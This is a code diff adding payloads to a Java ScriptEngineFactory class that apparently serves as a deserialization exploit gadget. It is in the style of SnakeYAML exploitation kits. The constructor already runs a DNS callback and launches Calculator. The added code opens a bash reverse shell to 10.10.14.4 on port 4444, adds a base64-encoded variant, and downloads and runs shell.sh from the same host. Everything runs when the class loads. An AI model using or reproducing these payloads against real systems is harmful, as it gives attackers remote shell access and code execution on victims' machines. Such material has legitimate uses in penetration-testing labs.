@@ -8,12 +8,37 @@ import java.util.List;
 public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
+        // Original payloads
         try {
             Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
             Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
         } catch (IOException e) {
             e.printStackTrace();
         }
+        
+        // Additional payload examples - reverse shell commands
+        String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"};
+        String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
+        try {
+            Runtime.getRuntime().exec(cmd);
+            Runtime.getRuntime().exec(jex);
+            Runtime.getRuntime().exec("echo $jex");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        
+        // Additional payload examples - curl and execute commands
+        RunCmd("curl 10.10.14.4/shell.sh -o /tmp/shell.sh");
+        RunCmd("bash /tmp/shell.sh");
+    }
+
+    public String RunCmd(String Cmd) {
+        try {
+            Runtime.getRuntime().exec(Cmd);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return null;
     }
 
     @Override
